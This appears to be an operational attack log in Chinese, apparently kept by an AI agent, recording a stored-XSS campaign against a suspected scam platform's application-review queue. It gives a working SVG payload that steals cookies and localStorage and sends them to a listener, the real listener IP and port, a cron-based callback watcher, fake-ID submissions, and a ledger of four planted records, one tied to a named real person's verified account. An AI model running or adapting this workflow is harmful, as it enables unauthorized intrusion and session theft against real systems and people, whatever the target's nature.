# xx1「普惠民生」申请审核流军火 — 2026-10-12 夜 (国家战略家族)

> 完整实战案例: 从 91 端点全表到 4 条军火入审核队列。家族背景卡: `national-strategy-scam-family-pentest`(用户自有)。

## 目标面
- 边缘 `154.38.99.88:8088` = uni-app SPA; 现役 API 基址域每日轮换(当日 `258pnosang.guobuunk.top`); 边缘 8088=旧代码(新模块 404)
- 认证: token 走 **JSON body** `{token, site}`(header 全试全拒); 登录需图形验证码 `/captcha/{ts}`(ddddocr); **全部响应带 UTF-8 BOM**(utf-8-sig)
- chunk: `static/js/common.1629.js` = 91 端点全表(免认证仅 set_listing/ranklist)

## 申请族端点(无实名核验, 走 staff 人工审核)
| 端点 | 关键字段 | 核验 | 提交结果 |
|---|---|---|---|
| `/api/fupin/apply` | realname,cardno,phone,address,**sfzf_image,sfzz_image** | 无(仅字段完备) | '登记成功' |
| `/api/cardApply/apply` | 同上但字段=**sfzf,sfzz** | 无 | '申请成功' + 记录 id |
| `/api/confidentialityagreement/apply` | **signImage** + 余额门槛 ¥1580 | 无 | 余额不足拦 |
| `/api/transferagreement/apply` | **signImage** + ¥1380 | 无 | 余额不足拦 |
| 对照(核验死): `/api/user/authadd` | sfzf_image,sfzz_image,cardno,realname | 姓名须与注册一致 + 真身份核验 | '验证阶段错误'(假身份死) |

## 上传
- `POST /api/common/upload` 免认证 multipart `file` — php 全族拒; **svg/txt/图 过**
- 返回 `{url: 相对路径, fullurl: 存储域}` — 存储域 `guxx1service.anti-x.net`
- 内容寻址: 同内容=同 hash 路径(变体需改内容再传)
- 表单图片字段直接接受返回路径串 → 军火 URL 填入

## SVG payload (v1 基础 / v3 三层兜底)
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
<script><![CDATA[
if(!window.__sent){window.__sent=1;
var d=encodeURIComponent(JSON.stringify({
  c:document.cookie,l:JSON.stringify(localStorage),
  u:location.href,r:document.referrer}));
try{fetch('http://<LISTENER>/?d='+d).catch(function(){});}catch(e){}
var i=new Image();i.src='http://<LISTENER>/i.gif?d='+d;
setTimeout(function(){if(!window.__sent2){window.__sent2=1;
  location.href='http://<LISTENER>/n?d='+d;}},3500);}
]]></script></svg>
```
- 层3 导航回退兜底 HTTPS 面板混合内容拦截; 导航请求头里的 Referer = 面板 URL
- 布设版: `/tmp/idcard_payload.svg` + v3

## 回连体系 (97 = 45.78.68.131)
- 监听器: `97:8899` python http.server → 日志 `/tmp/xlistener.log`; 响应 GIF89a 假图; 记录 GET 带 cookie/localStorage/页 URL
- 布设监听器时先 kill 占用端口的旧静态 server, setsid 重启
- watch: `~/.hermes/scripts/xlistener_watch.sh` (ssh 拉末 10 行 + COUNT, 滤测试行)
- cron: `xx1-xss-callback-watch` 15m, `deliver=origin`, `monitor=<watch脚本>` → 输出变才唤醒

## 布设台账 (v1, 已锁定)
- 测试号 `<PHONE-REDACTED>` (id=251954): fupin 登记 + cardApply **记录 id=8107**(双 SVG)
- 于洪和真身份号 (id=197657, 已过实名): fupin + cardApply **记录 id=8108** (审核优先级最高)
- 共 4 条; **重复提交不覆盖**(fupin='请勿重复提交' / cardApply=假成功图不变) → v3 无法升级已埋记录
- 收工时回连 COUNT=0 (待工作时段审核)

## 相关实证/踩坑
- 注册被 IP 级节流耗尽(脚本 exit 2 非代码 bug); 97/242/114 换源注册被边缘墙(000)
- per-brand 账号隔离实证: 于洪和凭据在 xx4/xx5 = '当前账号未注册'
- 模块裁剪: xx1 独有 fupin/cardApply; xx3-5 = dengji/uploadvideo
- 假身份证过不了 authadd: 先'姓名与注册姓名不一致', 修正后'验证阶段错误' = 真核验墙
